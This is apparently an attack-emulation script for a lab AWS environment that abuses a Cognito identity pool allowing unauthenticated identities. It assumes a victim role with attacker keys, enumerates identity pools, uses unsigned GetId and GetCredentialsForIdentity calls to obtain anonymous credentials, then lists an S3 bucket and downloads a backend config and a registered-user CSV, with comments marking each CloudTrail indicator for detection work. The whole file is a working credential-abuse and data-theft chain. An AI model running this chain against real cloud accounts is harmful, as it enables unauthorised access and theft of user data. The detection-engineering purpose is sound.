# FILE: attack.py
"""
ATOMIC-cognito-identity-pool-unauth-creds -- Automated Post-Exploitation Attack Script
Executes a 3-phase attack chain: attacker user AssumeRole -> Cognito pool enumeration
-> unsigned GetId/GetCredentialsForIdentity -> S3 data access with unauth Cognito creds.

MITRE ATT&CK: T1078.004 (Valid Accounts: Cloud Accounts)
Tactics: Initial Access, Discovery, Credential Access, Collection
"""
import sys
import time
import random
import json
import boto3
import botocore
from botocore import UNSIGNED
from botocore.config import Config
from botocore.exceptions import ClientError

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ── Static resource names (known at code-gen time; do NOT override with outputs) ──
_IDENTITY_POOL_NAME  = "prod-mobile-identities"
_UNAUTH_ROLE_NAME    = "atomic-cognito-identity-pool-unauth-creds-unauth-role"
_VICTIM_ROLE_NAME    = "atomic-cognito-identity-pool-unauth-creds-victim-role"
_ATTACKER_USER_NAME  = "atomic-cognito-identity-pool-unauth-creds-attacker"
_BAIT_APP_CONFIG_KEY = "config/app-backend-config.json"
_BAIT_USER_CSV_KEY   = "exports/registered-users-2026-07.csv"


# ── Print helpers ─────────────────────────────────────────────────────────────
def print_step(msg):
    print(f"\n[*] {msg}")

def print_ok(msg):
    print(f"[+] {msg}")

def print_err(msg):
    print(f"[-] {msg}")

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    time.sleep(random.uniform(5, 15))


# ── Credential helpers ────────────────────────────────────────────────────────
def _session_from_sts_creds(creds_dict, region):
    """Build a boto3 Session from an STS Credentials dict (AssumeRole response)."""
    return boto3.Session(
        aws_access_key_id=creds_dict["AccessKeyId"],
        aws_secret_access_key=creds_dict["SecretAccessKey"],
        aws_session_token=creds_dict["SessionToken"],
        region_name=region,
    )

def _session_from_cognito_creds(creds_dict, region):
    """Build a boto3 Session from a Cognito GetCredentialsForIdentity response.
    Note: Cognito uses 'SecretKey', not 'SecretAccessKey'."""
    return boto3.Session(
        aws_access_key_id=creds_dict["AccessKeyId"],
        aws_secret_access_key=creds_dict["SecretKey"],
        aws_session_token=creds_dict["SessionToken"],
        region_name=region,
    )


# ── Phase 1: Initial Access -- AssumeRole into victim-role ────────────────────
def phase1_initial_access(attacker_key_id, attacker_key_secret, victim_role_arn, region):
    """
    T1078.004: Use long-lived attacker user static keys to AssumeRole into the
    victim role. Establishes a short-lived STS session scoped to Cognito
    enumeration permissions.
    """
    print("\n" + "="*60)
    print("PHASE 1 -- Initial Access: AssumeRole into Victim Role")
    print("="*60)

    print_step("Step 1: Assuming victim role using attacker user static keys")
    print(f"        RoleArn: {victim_role_arn}")

    attacker_session = boto3.Session(
        aws_access_key_id=attacker_key_id,
        aws_secret_access_key=attacker_key_secret,
        region_name=region,
    )
    sts = attacker_session.client("sts")

    try:
        resp = sts.assume_role(
            RoleArn=victim_role_arn,
            RoleSessionName="emulation-cognito-unauth",
        )
        victim_creds = resp["Credentials"]
        print_ok(f"AssumeRole succeeded -> session key {victim_creds['AccessKeyId']}")
        print_ok("CloudTrail event: AssumeRole (sts.amazonaws.com)")
        # IOC: AssumeRole from attacker IAM user into victim-role
        op_delay(2, 5)
        return _session_from_sts_creds(victim_creds, region)
    except ClientError as e:
        raise RuntimeError(f"Phase 1 AssumeRole failed: {e}")


# ── Phase 2: Discovery -- Cognito Identity Pool Enumeration ──────────────────
def phase2_discovery(victim_session, identity_pool_id_hint, region):
    """
    T1078.004: Use victim STS session to enumerate Cognito identity pools and
    confirm the target pool has AllowUnauthenticatedIdentities=True.
    """
    print("\n" + "="*60)
    print("PHASE 2 -- Discovery: Cognito Identity Pool Enumeration")
    print("="*60)

    cognito = victim_session.client("cognito-identity", region_name=region)

    # ── Step 2: List identity pools to find the target ────────────────────────
    print_step("Step 2: Listing Cognito identity pools (victim session)")

    found_pool_id = None
    try:
        paginator_resp = cognito.list_identity_pools(MaxResults=60)
        pools = paginator_resp.get("IdentityPools", [])
        print_ok(f"ListIdentityPools returned {len(pools)} pool(s)")
        print_ok("CloudTrail event: ListIdentityPools (cognito-identity.amazonaws.com)")
        # IOC: ListIdentityPools enumeration from victim-role session

        for pool in pools:
            if pool.get("IdentityPoolName", "").endswith("prod-mobile-identities"):
                found_pool_id = pool["IdentityPoolId"]
                print_ok(f"Target pool found: '{pool['IdentityPoolName']}' -> {found_pool_id}")
                break

        # Paginate if not found in first page
        while not found_pool_id and paginator_resp.get("NextToken"):
            paginator_resp = cognito.list_identity_pools(
                MaxResults=60,
                NextToken=paginator_resp["NextToken"],
            )
            pools = paginator_resp.get("IdentityPools", [])
            for pool in pools:
                if pool.get("IdentityPoolName", "").endswith("prod-mobile-identities"):
                    found_pool_id = pool["IdentityPoolId"]
                    print_ok(f"Target pool found (page 2+): '{pool['IdentityPoolName']}' -> {found_pool_id}")
                    break

    except ClientError as e:
        print_err(f"ListIdentityPools failed: {e}")

    if not found_pool_id:
        if identity_pool_id_hint:
            print_ok(f"Pool not found by name enumeration; using outputs hint: {identity_pool_id_hint}")
            found_pool_id = identity_pool_id_hint
        else:
            raise RuntimeError("Could not locate target identity pool by name and no hint in outputs")

    op_delay(2, 5)

    # ── Step 3: Describe pool to confirm misconfiguration ─────────────────────
    print_step("Step 3: Describing identity pool to confirm AllowUnauthenticatedIdentities=True")
    try:
        desc = cognito.describe_identity_pool(IdentityPoolId=found_pool_id)
        allow_unauth = desc.get("AllowUnauthenticatedIdentities", False)
        if allow_unauth:
            print_ok(f"AllowUnauthenticatedIdentities=True confirmed on pool {found_pool_id}")
        else:
            print_err(f"AllowUnauthenticatedIdentities=False -- pool may have been remediated")
        print_ok("CloudTrail event: DescribeIdentityPool (cognito-identity.amazonaws.com)")
        # IOC: DescribeIdentityPool from victim-role confirming unauthenticated access enabled
    except ClientError as e:
        print_err(f"DescribeIdentityPool failed: {e}")

    op_delay(2, 4)
    return found_pool_id


# ── Phase 3: Credential Access + Collection ───────────────────────────────────
def phase3_credential_access_and_collection(
    identity_pool_id, account_id, target_bucket_name, region
):
    """
    T1078.004: Issue GetId and GetCredentialsForIdentity using a fully UNSIGNED
    boto3 client (SigV4 disabled) so CloudTrail attributes both calls to the
    anonymous unauthenticated principal. Then use the resulting temporary STS
    credentials to enumerate and exfiltrate objects from the target S3 bucket.
    """
    print("\n" + "="*60)
    print("PHASE 3 -- Credential Access + Collection")
    print("="*60)

    # Build the UNSIGNED cognito-identity client -- no credentials passed,
    # SigV4 fully disabled so CloudTrail logs an anonymous/unauthenticated
    # principal. This unsigned attribution IS the detection surface.
    cognito_unauth = boto3.client(
        "cognito-identity",
        region_name=region,
        config=Config(signature_version=UNSIGNED),
    )

    # ── Step 4: GetId (unsigned / anonymous) ──────────────────────────────────
    print_step("Step 4: Calling GetId with UNSIGNED client (no SigV4 -- anonymous principal)")
    print(f"        AccountId={account_id}, IdentityPoolId={identity_pool_id}")

    identity_id = None
    try:
        get_id_resp = cognito_unauth.get_id(
            AccountId=account_id,
            IdentityPoolId=identity_pool_id,
        )
        identity_id = get_id_resp["IdentityId"]
        print_ok(f"GetId succeeded -> IdentityId: {identity_id}")
        print_ok("CloudTrail event: GetId (cognito-identity.amazonaws.com) -- principal: anonymous")
        # IOC: GetId with no SigV4 signing -> CloudTrail records anonymous principal
    except ClientError as e:
        raise RuntimeError(f"Phase 3 GetId failed: {e}")

    op_delay(2, 5)

    # ── Step 5: GetCredentialsForIdentity (unsigned / anonymous) ──────────────
    print_step("Step 5: Calling GetCredentialsForIdentity with UNSIGNED client")
    print(f"        IdentityId={identity_id}")

    unauth_creds = None
    try:
        gcfi_resp = cognito_unauth.get_credentials_for_identity(IdentityId=identity_id)
        unauth_creds = gcfi_resp["Credentials"]
        print_ok(f"GetCredentialsForIdentity succeeded -> key {unauth_creds['AccessKeyId']}")
        print_ok("CloudTrail event: GetCredentialsForIdentity (cognito-identity.amazonaws.com) -- principal: anonymous")
        # IOC: Temporary STS creds issued to unauthenticated Cognito identity for unauth-role
    except ClientError as e:
        raise RuntimeError(f"Phase 3 GetCredentialsForIdentity failed: {e}")

    op_delay(2, 5)

    # Build session from Cognito credentials (SecretKey, not SecretAccessKey)
    unauth_session = _session_from_cognito_creds(unauth_creds, region)

    # ── Step 6: Verify credentials with GetCallerIdentity ────────────────────
    print_step("Step 6: Verifying unauth Cognito credentials via GetCallerIdentity")

    unauth_sts = unauth_session.client("sts")
    try:
        identity = unauth_sts.get_caller_identity()
        caller_arn = identity.get("Arn", "")
        print_ok(f"GetCallerIdentity -> {caller_arn}")
        print_ok("CloudTrail event: GetCallerIdentity (sts.amazonaws.com) -- caller: unauth-role session")
        if _UNAUTH_ROLE_NAME in caller_arn:
            print_ok("Caller ARN matches unauth-role -- privilege acquisition confirmed")
        else:
            print_err(f"Unexpected caller ARN: {caller_arn}")
        # IOC: GetCallerIdentity from unauth Cognito role STS session
    except ClientError as e:
        print_err(f"GetCallerIdentity failed: {e}")

    op_delay(2, 4)

    # ── Step 7: List objects in target S3 bucket ──────────────────────────────
    print_step(f"Step 7: Listing objects in target S3 bucket '{target_bucket_name}'")

    unauth_s3 = unauth_session.client("s3", region_name=region)
    try:
        list_resp = unauth_s3.list_objects_v2(Bucket=target_bucket_name)
        objects = list_resp.get("Contents", [])
        print_ok(f"ListObjectsV2 returned {len(objects)} object(s):")
        for obj in objects:
            print(f"    {obj['Key']}  ({obj['Size']} bytes)")
        print_ok("CloudTrail event: ListObjects (s3.amazonaws.com) -- caller: unauth-role session")
        # IOC: S3 ListObjects on target bucket from unauth Cognito role session
    except ClientError as e:
        print_err(f"ListObjectsV2 failed: {e}")

    op_delay(2, 5)

    # ── Step 8: Exfiltrate mobile app backend config ──────────────────────────
    print_step(f"Step 8: Downloading bait file '{_BAIT_APP_CONFIG_KEY}'")

    try:
        get_resp = unauth_s3.get_object(Bucket=target_bucket_name, Key=_BAIT_APP_CONFIG_KEY)
        body = get_resp["Body"].read().decode("utf-8", errors="replace")
        print_ok(f"GetObject succeeded for '{_BAIT_APP_CONFIG_KEY}'")
        print(f"    Content preview: {body[:300]}")
        print_ok("CloudTrail event: GetObject (s3.amazonaws.com) -- config/app-backend-config.json")
        # IOC: S3 GetObject on config/app-backend-config.json from unauth Cognito role session
    except ClientError as e:
        print_err(f"GetObject '{_BAIT_APP_CONFIG_KEY}' failed: {e}")

    op_delay(2, 4)

    # ── Step 9: Exfiltrate registered-user CSV ────────────────────────────────
    print_step(f"Step 9: Downloading bait file '{_BAIT_USER_CSV_KEY}'")

    try:
        get_resp = unauth_s3.get_object(Bucket=target_bucket_name, Key=_BAIT_USER_CSV_KEY)
        body = get_resp["Body"].read().decode("utf-8", errors="replace")
        print_ok(f"GetObject succeeded for '{_BAIT_USER_CSV_KEY}'")
        print(f"    Content preview: {body[:300]}")
        print_ok("CloudTrail event: GetObject (s3.amazonaws.com) -- exports/registered-users-2026-07.csv")
        # IOC: S3 GetObject on exports/registered-users-2026-07.csv from unauth Cognito role session
    except ClientError as e:
        print_err(f"GetObject '{_BAIT_USER_CSV_KEY}' failed: {e}")

    op_delay(1, 3)


# ── Entry point (backend contract) ────────────────────────────────────────────
def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Backend contract entry point.
    All credentials and dynamic resource values are read from `outputs`.
    """
    print("\n" + "="*60)
    print("ATOMIC: Cognito Identity Pool Unauthenticated Credential Abuse")
    print("T1078.004 -- Valid Accounts: Cloud Accounts")
    print("="*60)

    # ── Resolve required outputs ──────────────────────────────────────────────
    attacker_key_id     = outputs.get("attacker_access_key_id")
    attacker_key_secret = outputs.get("attacker_secret_access_key")
    victim_role_arn     = outputs.get("victim_role_arn")
    identity_pool_id_h  = outputs.get("identity_pool_id")   # hint for fallback
    target_bucket_name  = outputs.get("target_bucket_name")
    unauth_role_arn     = outputs.get("unauth_role_arn")     # for post-run verification

    missing = [k for k, v in {
        "attacker_access_key_id":     attacker_key_id,
        "attacker_secret_access_key": attacker_key_secret,
        "victim_role_arn":            victim_role_arn,
        "target_bucket_name":         target_bucket_name,
    }.items() if not v]
    if missing:
        raise RuntimeError(f"Required outputs missing: {missing}")

    # Parse account_id from victim_role_arn (field 4 when split on ':')
    # Example ARN: arn:aws:iam::123456789012:role/name  -> index 4 = '123456789012'
    account_id = victim_role_arn.split(":")[4]
    print_ok(f"Resolved account_id: {account_id}")
    print_ok(f"Target bucket: {target_bucket_name}")
    print_ok(f"Victim role: {victim_role_arn}")
    if unauth_role_arn:
        print_ok(f"Unauth role (expected post-Cognito identity): {unauth_role_arn}")

    # ── Phase 1: Initial Access ───────────────────────────────────────────────
    victim_session = phase1_initial_access(
        attacker_key_id, attacker_key_secret, victim_role_arn, region
    )
    phase_delay()

    # ── Phase 2: Discovery ────────────────────────────────────────────────────
    identity_pool_id = phase2_discovery(victim_session, identity_pool_id_h, region)
    phase_delay()

    # ── Phase 3: Credential Access + Collection ───────────────────────────────
    phase3_credential_access_and_collection(
        identity_pool_id, account_id, target_bucket_name, region
    )

    # ── Summary ───────────────────────────────────────────────────────────────
    print("\n" + "="*60)
    print("ATTACK COMPLETE -- CloudTrail Events Generated")
    print("="*60)
    print("  Step 1: AssumeRole                 (sts.amazonaws.com)")
    print("  Step 2: ListIdentityPools           (cognito-identity.amazonaws.com)")
    print("  Step 3: DescribeIdentityPool        (cognito-identity.amazonaws.com)")
    print("  Step 4: GetId                       (cognito-identity.amazonaws.com) [anonymous/unsigned]")
    print("  Step 5: GetCredentialsForIdentity   (cognito-identity.amazonaws.com) [anonymous/unsigned]")
    print("  Step 6: GetCallerIdentity           (sts.amazonaws.com)              [unauth-role session]")
    print("  Step 7: ListObjects                 (s3.amazonaws.com)               [unauth-role session]")
    print("  Step 8: GetObject config file       (s3.amazonaws.com)               [unauth-role session]")
    print("  Step 9: GetObject user export CSV   (s3.amazonaws.com)               [unauth-role session]")
    print("")
    print("Detection notes:")
    print("  - Steps 4+5 have no SigV4 signature; CloudTrail principal = anonymous Cognito identity")
    print("  - Steps 6-9 are attributed to the unauth-role STS session")
    print("  - Steps 1-3 are attributed to the victim-role STS session (attacker user origin)")
    print("  - No attack-created resources; all cleanup handled by pulumi destroy")
